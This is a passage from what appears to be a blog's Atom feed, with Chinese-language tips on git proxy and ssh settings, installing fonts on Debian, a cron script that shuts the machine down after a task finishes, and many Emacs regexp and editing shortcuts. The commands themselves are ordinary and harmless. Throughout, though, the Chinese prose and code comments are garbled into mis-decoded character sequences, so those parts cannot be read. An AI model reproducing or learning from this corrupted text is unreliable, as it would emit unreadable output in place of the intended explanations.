&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ˜¯çš„ï¼Œæ”¯æŒ socks5 åè®®&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git config --global http.proxy &lt;span class="s1">&amp;#39;socks5://127.0.0.1:7070&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å–æ¶ˆä»£ç†&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git config --global --unset http.proxy
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;a href="https://git-scm.com/docs/git-config#git-config-httpproxy">å‚è€ƒè¿™ç¯‡æ–‡æ¡£&lt;/a>ï¼Œè™½ç„¶åå­—å«Â &lt;strong>&lt;code>http&lt;/code>&lt;/strong>&lt;code>.proxy&lt;/code> ï¼Œä½†å…¶å®ä¹Ÿæ”¯æŒ httpsã€‚&lt;/p>
&lt;p>å¦å¤–ï¼Œå¦‚æœå¸Œæœ›åŸŸåä¹Ÿé€šè¿‡ä»£ç†æ¥è§£æçš„è¯ï¼Œåˆ™åº”è¯¥å°† &lt;code>socks5&lt;/code> æ›¿æ¢ä¸º &lt;code>socks5h&lt;/code> ã€‚&lt;/p>
&lt;h2 id="git-through-ssh">Git through ssh&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># git through ssh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">git&lt;/span> &lt;span class="n">remote&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">origin&lt;/span> &lt;span class="n">ssh&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="nd">@my.git.svr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">repo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="git-filter-branch">git filter-branch&lt;/h2>
&lt;p>// TODO&lt;/p>
&lt;h2 id="git-branching-model">Git branching model&lt;/h2>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/8cb29db0-8c81-41c8-a5ac-0e85e3cddca0/Untitled.png" alt="">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://nvie.com/posts/a-successful-git-branching-model/">https://nvie.com/posts/a-successful-git-branching-model/&lt;/a>&lt;/p></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/git/" term="Git" label="Git"/></entry><entry><title type="text">Linux Tips: å®‰è£…æ–°å­—ä½“</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/linux-tips-setup-fonts/"/><id>https://mincodes.com/posts/linux-tips-setup-fonts/</id><updated>2022-12-04T13:09:00+00:00</updated><published>2022-12-03T10:15:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Debian ä¸Šå®‰è£…å­—ä½“ï¼Œå°±è¿™ä¹ˆç®€å•ï¼š 1 2 3 mkdir ~/.fonts cp simsun.ttf ~/.fonts/ sudo fc-cache -fv æå®šï¼ä¼˜é›…ï½</summary><content type="html">&lt;p>Debian ä¸Šå®‰è£…å­—ä½“ï¼Œå°±è¿™ä¹ˆç®€å•ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mkdir ~/.fonts
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp simsun.ttf ~/.fonts/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo fc-cache -fv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æå®šï¼ä¼˜é›…ï½&lt;/p></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/></entry><entry><title type="text">Linux Tips: ä»»åŠ¡å®Œæˆåè‡ªåŠ¨å…³æœº</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/linux-tips-auto-shutdown-after-task-done/"/><id>https://mincodes.com/posts/linux-tips-auto-shutdown-after-task-done/</id><updated>2022-12-04T13:09:00+00:00</updated><published>2022-12-03T10:09:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">æœ‰æ—¶å¸Œæœ›è®¡ç®—æœºåœ¨å®ŒæˆæŸé¡¹ä»»åŠ¡åè‡ªåŠ¨å…³æœºï¼Œä¾‹å¦‚ï¼Œæ­£åœ¨ä½¿ç”¨ git ä¸‹è½½è¾ƒå¤§çš„ä»£ç ä»“åº“ï¼Œåˆæˆ–è€…æ­£ç”¨ wget ä¸‹è½½å¤§æ–‡ä»¶ï¼Œâ€¦</summary><content type="html">&lt;p>æœ‰æ—¶å¸Œæœ›è®¡ç®—æœºåœ¨å®ŒæˆæŸé¡¹ä»»åŠ¡åè‡ªåŠ¨å…³æœºï¼Œä¾‹å¦‚ï¼Œæ­£åœ¨ä½¿ç”¨ &lt;code>git&lt;/code> ä¸‹è½½è¾ƒå¤§çš„ä»£ç ä»“åº“ï¼Œåˆæˆ–è€…æ­£ç”¨ &lt;code>wget&lt;/code> ä¸‹è½½å¤§æ–‡ä»¶ï¼Œå¦‚æœæ­¤æ—¶éœ€è¦ç¦»å¼€ï¼Œåˆä¸æƒ³ä¸­æ–­ä»»åŠ¡ï¼Œæœ€å¥½çš„åŠæ³•å°±æ˜¯è®¾ç½®å…¶å®Œæˆåè‡ªåŠ¨å…³æœºäº†ã€‚&lt;/p>
&lt;p>è¿™é‡Œä»‹ç»ä¸€ç§åŠæ³•ï¼Œåˆ©ç”¨ &lt;code>cron&lt;/code> æœºåˆ¶ç›‘æ§ä»»åŠ¡çš„å®Œæˆæƒ…å†µï¼Œå¹¶åœ¨ä»»åŠ¡ç»“æŸåï¼Œæ‰§è¡Œå…³æœºæŒ‡ä»¤ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>è·å–ä»»åŠ¡çš„ pid :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ps -eo pid,command &lt;span class="p">|&lt;/span> grep git
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>ç¼–å†™å…³æœºè„šæœ¬ï¼Œå‡è®¾å­˜æ”¾åœ¨æ–‡ä»¶ &lt;code>/path/to/halt-if-gone&lt;/code> ä¸­ï¼ˆä¸è¦å¿˜äº†åŠ ä¸Šå¯æ‰§è¡Œæƒé™ï¼‰:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#! /bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="nv">$#&lt;/span> -eq &lt;span class="m">1&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 2åˆ†é’Ÿåå…³æœºï¼Œè®©ä½ æœ‰åæ‚”çš„ä½™åœ°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ps -eo pid &lt;span class="p">|&lt;/span> grep &lt;span class="nv">$1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>&amp;gt; /dev/null &lt;span class="o">||&lt;/span> /sbin/shutdown -h +2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>è®¾ç½® &lt;code>cron&lt;/code> æŒ‡ä»¤ï¼Œæ¯15åˆ†é’Ÿæ‰«æä¸€æ¬¡ï¼ˆå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç¼©çŸ­æ‰«æé—´éš”ï¼‰::&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è¯·å°† $TASK_PID æ›¿æ¢ä¸ºä½ è¦ç­‰å¾…çš„ä»»åŠ¡çš„ pid&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*/15 * * * * /path/to/halt-if-gone &lt;span class="nv">$TASK_PID&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/></entry><entry><title type="text">Emacs Tips</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/emacs-tips/"/><id>https://mincodes.com/posts/emacs-tips/</id><updated>2023-04-25T13:43:00+00:00</updated><published>2022-12-03T09:59:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Macro å®å½•åˆ¶ &amp;amp; å›æ”¾ å¼€å§‹å½•åˆ¶ï¼š C-x ( ç»“æŸå½•åˆ¶ï¼š C-x ) å›æ”¾å®ï¼š C-x e Regexp ç›¸å…³ M-x count-matches ç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•° C-M-s æ­£åˆ™æœç´¢ M-x replace-regexp æ­£â€¦</summary><content type="html">&lt;h2 id="macro-å®å½•åˆ¶--å›æ”¾">Macro å®å½•åˆ¶ &amp;amp; å›æ”¾&lt;/h2>
&lt;ol>
&lt;li>å¼€å§‹å½•åˆ¶ï¼š &lt;code>C-x (&lt;/code>&lt;/li>
&lt;li>ç»“æŸå½•åˆ¶ï¼š &lt;code>C-x )&lt;/code>&lt;/li>
&lt;li>å›æ”¾å®ï¼š &lt;code>C-x e&lt;/code>&lt;/li>
&lt;/ol>
&lt;h2 id="regexp-ç›¸å…³">Regexp ç›¸å…³&lt;/h2>
&lt;p>&lt;code>M-x&lt;/code> &lt;code>count-matches&lt;/code> ç»Ÿè®¡æ­£åˆ™åŒ¹é…åˆ°çš„æ¬¡æ•°&lt;/p>
&lt;p>&lt;code>C-M-s&lt;/code> æ­£åˆ™æœç´¢&lt;/p>
&lt;p>&lt;code>M-x&lt;/code> &lt;code>replace-regexp&lt;/code> æ­£åˆ™æ›¿æ¢&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç¤ºä¾‹ï¼šåœ¨æ¯è¡Œåé¢è¿½åŠ æ–‡æœ¬ xyz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">M-x replace-regexp RET $ RET xyz RET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mauth&lt;span class="se">\(&lt;/span>&lt;span class="o">[&lt;/span>^-&lt;span class="o">]&lt;/span>&lt;span class="se">\)&lt;/span> â†’ mauth-front&lt;span class="se">\1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>C-M-%&lt;/code> or &lt;code>query-replace-regexp&lt;/code> æ­£åˆ™æŸ¥æ‰¾ &amp;amp; æ›¿æ¢&lt;/p>
&lt;p>é«˜çº§ç”¨æ³•ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ‰§è¡Œæ›¿æ¢ï¼šauth\b\([^-]\) â†’ auth-front\1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C-M-% auth&lt;span class="se">\b\(&lt;/span>&lt;span class="o">[&lt;/span>^-&lt;span class="o">]&lt;/span>&lt;span class="se">\)&lt;/span> RET auth-front&lt;span class="se">\1&lt;/span> RET
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šè¿°ç¤ºä¾‹çš„æ‰§è¡Œæ•ˆæœï¼š&lt;/p>
&lt;ol>
&lt;li>é¦–å…ˆåŒ¹é…åˆ°æ‰€æœ‰ auth å¼€å¤´çš„å•è¯ï¼Œå¹¶ä¸”æ’é™¤æ‰ &amp;ldquo;auth-&amp;rdquo; çš„ caseï¼›&lt;/li>
&lt;li>å°†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ â€œauth:â€ã€â€œauth+â€ ç­‰ï¼Œåé¢æ’å…¥ â€œ-frontâ€ï¼Œä¾‹å¦‚æ›¿æ¢ä¸ºï¼šâ€auth-front:â€ã€â€auth-front+â€&lt;/li>
&lt;/ol>
&lt;p>&lt;code>M-s&lt;/code> &lt;code>o pattern RET&lt;/code> åˆ—å‡ºæ‰€æœ‰åŒ¹é…è¡Œ&lt;/p>
&lt;p>&lt;code>C-u&lt;/code> &lt;code>M-s&lt;/code> &lt;code>o pattern RET&lt;/code> å°†æ‰€æœ‰åŒ¹é…çš„æ–‡æœ¬ï¼Œå¯¼å‡ºåˆ° &lt;em>&lt;em>Occur&lt;/em> buffer ä¸­ã€‚&lt;/em>&lt;/p>
&lt;blockquote>
&lt;p>åœ¨è¾“å…¥æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œå¦‚æœéœ€è¦åŒ¹é…æ¢è¡Œç¬¦ï¼Œè¯·è¾“å…¥ &lt;code>C-j&lt;/code> ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>M-x&lt;/code> &lt;code>keep-lines&lt;/code> ä»…ä¿ç•™åŒ¹é…çš„è¡Œ&lt;/p>
&lt;p>&lt;code>M-x&lt;/code> &lt;code>flush-lines&lt;/code> å‰”é™¤åŒ¹é…çš„è¡Œ&lt;/p>
&lt;p>&lt;code>C-u C-x =&lt;/code> æ˜¾ç¤ºå…‰æ ‡æ‰€åœ¨å­—ç¬¦çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ­£åˆ™åˆ†ç»„ã€è¯­æ³•ç­‰ä¿¡æ¯ã€‚&lt;/p>
&lt;h3 id="åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾æ›¿æ¢">åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾ã€æ›¿æ¢&lt;/h3>
&lt;ol>
&lt;li>&lt;code>M-x find-name-dired&lt;/code>: ä¼šæç¤ºä½ é€‰æ‹©ä¸€ä¸ªç›®å½•ï¼Œä»¥åŠä¸€ä¸ª filename wildcard ç”¨äºåŒ¹é…ä½ æƒ³è¦æŸ¥æ‰¾çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¾‹å¦‚ &lt;code>*.el&lt;/code> ä¼šåŒ¹é…æ‰€æœ‰æ‰©å±•åä¸º &lt;code>.el&lt;/code> çš„æ–‡ä»¶ï¼›&lt;/li>
&lt;li>æŒ‰Â &lt;code>t&lt;/code>Â é€‰ä¸­æ‰€æœ‰åŒ¹é…åˆ°çš„æ–‡ä»¶ï¼›&lt;/li>
&lt;li>æŒ‰Â &lt;code>Q&lt;/code>Â æ‰§è¡Œ &amp;ldquo;Query replace regexp in marked files&amp;rdquo;ï¼Œå³æ­£åˆ™æŸ¥æ‰¾å’Œæ›¿æ¢ï¼›&lt;/li>
&lt;li>æ¥ä¸‹æ¥çš„æµç¨‹å’ŒÂ &lt;code>query-replace-regexp&lt;/code>Â ç±»ä¼¼ï¼Œè·Ÿç€æç¤ºèµ°å³å¯ï¼›&lt;/li>
&lt;li>æŒ‰Â &lt;code>C-x s&lt;/code>Â ä¿å­˜æ‰€æœ‰ä¿®æ”¹è¿‡çš„ buffersï¼ŒæŒ‰Â &lt;code>y&lt;/code>Â ä¿å­˜,Â &lt;code>n&lt;/code>Â è·³è¿‡, Â &lt;code>!&lt;/code>Â ä¿å­˜æ‰€æœ‰æ–‡ä»¶ã€‚&lt;/li>
&lt;/ol>
&lt;h3 id="æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•">æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.emacswiki.org/emacs/RegularExpression">https://www.emacswiki.org/emacs/RegularExpression&lt;/a>&lt;/p>
&lt;p>Emacs çš„æ­£åˆ™è¡¨è¾¾å¼å’Œ &lt;a href="https://docs.python.org/3/library/re.html">Python çš„è§„åˆ™&lt;/a>æœ‰äº›ç±»ä¼¼ï¼Œä½†è¿˜æ˜¯æœ‰ä¸å°‘å·®å¼‚ã€‚&lt;/p>
&lt;p>ä¸€äº›å€¼å¾—æ³¨æ„ or æœ‰æ„æ€çš„ç¤ºä¾‹ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>\` \'&lt;/code> åˆ†åˆ«è¡¨ç¤º buffer/string çš„å¼€å§‹å’Œç»“æŸ&lt;/li>
&lt;li>&lt;code>\s-&lt;/code> æˆ–è€… &lt;code>[[:space:]]&lt;/code> è¡¨ç¤ºç©ºç™½å­—ç¬¦&lt;/li>
&lt;li>&lt;code>\w\{20,\}&lt;/code> è¡¨ç¤ºé•¿åº¦å¤§äºç­‰äº20çš„å•è¯&lt;/li>
&lt;li>&lt;code>[-+[:digit:]]&lt;/code> è¡¨ç¤ºæ•°å­—æˆ–è€… â€œ-â€ æˆ–è€… â€œ+â€&lt;/li>
&lt;li>&lt;code>\w+er\&amp;gt;&lt;/code> è¡¨ç¤º er ç»“å°¾çš„å•è¯&lt;/li>
&lt;li>&lt;code>\(19\|20\)[0-9]\{2\}&lt;/code> åŒ¹é… 1900 ~ 2099&lt;/li>
&lt;/ul>
&lt;h3 id="ä½¿ç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼çš„å‘½ä»¤åˆé›†">ä½¿ç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼çš„å‘½ä»¤åˆé›†&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl"> C-M-s incremental forward search matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> C-M-r incremental backward search matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> replace-regexp replace string matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> query-replace-regexp same, but query before each replacement
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> align-regexp align, using strings matching regexp as delimiters
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> highlight-regexp highlight strings matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> occur show lines containing a match
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> multi-occur show lines in all buffers containing a match
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> how-many count the number of strings matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> keep-lines delete all lines except those containing matches
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> flush-lines delete lines containing matches
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> grep call unix grep command and put result in a buffer
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> lgrep user-friendly interface to the grep command
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> rgrep recursive grep
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dired-do-copy-regexp copy files with names matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dired-do-rename-regexp rename files matching regexp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> find-grep-dired display files containing matches for regexp with Dired
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æ‹¬å·ç›¸å…³">æ‹¬å·ç›¸å…³&lt;/h2>
&lt;ul>
&lt;li>&lt;code>C-M-u&lt;/code> backward-up-list, è·³åˆ°ä¸Šä¸€ä¸ªæ‹¬å·å¤„&lt;/li>
&lt;li>&lt;code>C-M-d&lt;/code> down-listï¼Œå‘å†…è·³&lt;/li>
&lt;li>&lt;code>C-M-u C-M-SPC&lt;/code> é€‰ä¸­æ•´ä¸ªæ‹¬å·åŒºåŸŸ&lt;/li>
&lt;li>&lt;code>C-M-n&lt;/code> forward-listï¼Œè·³åˆ°ä¸‹ä¸€ä¸ªæ‹¬å·å¤„&lt;/li>
&lt;li>&lt;code>C-M-p&lt;/code> backward-listï¼Œè·³åˆ°ä¸Šä¸€ä¸ªæ‹¬å·å¤„&lt;/li>
&lt;/ul>
&lt;h2 id="org-mode">Org-mode&lt;/h2>
&lt;p>&lt;code>C-c C-, s&lt;/code> &lt;code>org-insert-structure-template&lt;/code> å¿«æ·æ’å…¥ä»£ç å—&lt;/p>
&lt;p>&lt;code>C-c &amp;lt;&lt;/code> &lt;code>org-date-from-calendar&lt;/code> æ’å…¥æˆ–æ›´æ–°æ—¥æœŸ&lt;/p>
&lt;h2 id="å¸¸è§„ç¼–è¾‘åŠŸèƒ½">å¸¸è§„ç¼–è¾‘åŠŸèƒ½&lt;/h2>
&lt;h3 id="æ¢ä½æ“ä½œ-transpose--objects">æ¢ä½æ“ä½œ Transpose Objects&lt;/h3>
&lt;p>&lt;code>C-t&lt;/code> transpose-chars&lt;/p>
&lt;p>&lt;code>M-t&lt;/code> transpose-words&lt;/p>
&lt;p>&lt;code>C-x C-t&lt;/code> transpose-lines&lt;/p>
&lt;p>Type &lt;code>M-x transpose SPACE&lt;/code> to see more transposing commands.&lt;/p>
&lt;p>&lt;code>C-x DEL&lt;/code> &lt;code>backward-kill-sentence&lt;/code> åˆ é™¤åˆ°è¡Œé¦–&lt;/p>
&lt;h3 id="åˆ—ç¼–è¾‘-rectangle">åˆ—ç¼–è¾‘ Rectangle&lt;/h3>
&lt;dl>
&lt;dt>&lt;code>C-x r r&lt;/code>&lt;/dt>
&lt;dd>Copy rectangle to region.&lt;/dd>
&lt;dt>&lt;code>C-x r i&lt;/code>&lt;/dt>
&lt;dd>Insert region.&lt;/dd>
&lt;dt>&lt;code>C-x r k&lt;/code>&lt;/dt>
&lt;dd>Kill the text of the region-rectangle, saving its contents as the â€œlast killed rectangleâ€ (kill-rectangle).&lt;/dd>
&lt;dt>&lt;code>C-x r d&lt;/code>&lt;/dt>
&lt;dd>Delete the text of the region-rectangle (delete-rectangle).&lt;/dd>
&lt;dt>&lt;code>C-x r y&lt;/code>&lt;/dt>
&lt;dd>Yank the last killed rectangle with its upper left corner at point (yank-rectangle).&lt;/dd>
&lt;dt>&lt;code>C-x r o&lt;/code>&lt;/dt>
&lt;dd>Insert blank space to fill the space of the region-rectangle (open-rectangle). This pushes the previous contents of the region-rectangle rightward.&lt;/dd>
&lt;dt>&lt;code>C-x r c&lt;/code>&lt;/dt>
&lt;dd>Clear the region-rectangle by replacing all of its contents with spaces (clear-rectangle).&lt;/dd>
&lt;dt>&lt;code>M-x delete-whitespace-rectangle&lt;/code>&lt;/dt>
&lt;dd>Delete whitespace in each of the lines on the specified rectangle, starting from the left edge column of the rectangle.&lt;/dd>
&lt;dt>&lt;code>C-x r t string &amp;lt;RET&amp;gt;&lt;/code>&lt;/dt>
&lt;dd>Replace rectangle contents with string on each line (string-rectangle).&lt;/dd>
&lt;dt>&lt;code>M-x string-insert-rectangle &amp;lt;RET&amp;gt; string &amp;lt;RET&amp;gt;&lt;/code>&lt;/dt>
&lt;dd>Insert string on each line of the rectangle.&lt;/dd>
&lt;/dl>
&lt;h3 id="å…¶ä»–">å…¶ä»–&lt;/h3>
&lt;p>&lt;code>M-x untabify&lt;/code> Convert all tabs in region to multiple spaces, preserving columns.&lt;/p>
&lt;p>&lt;code>C-x C-v&lt;/code> Find alternate file, ä¹Ÿå¯ä»¥ç”¨æ¥ reload file.&lt;/p>
&lt;h2 id="search">Search&lt;/h2>
&lt;p>&lt;code>C-s C-w&lt;/code> search for the word after the current mark
&lt;code>C-s C-y&lt;/code> searches for the rest of the line after the current mark
&lt;code>C-s C-M-y&lt;/code> searches for the character after the mark&lt;/p>
&lt;p>&lt;code>M-%&lt;/code> query-replace
&lt;code>C-M-%&lt;/code> query-replace-regexp&lt;/p>
&lt;p>regexp notes:&lt;/p>
&lt;ul>
&lt;li>spaces: &amp;ldquo;\s-&amp;rdquo;&lt;/li>
&lt;/ul>
&lt;h2 id="jump">Jump&lt;/h2>
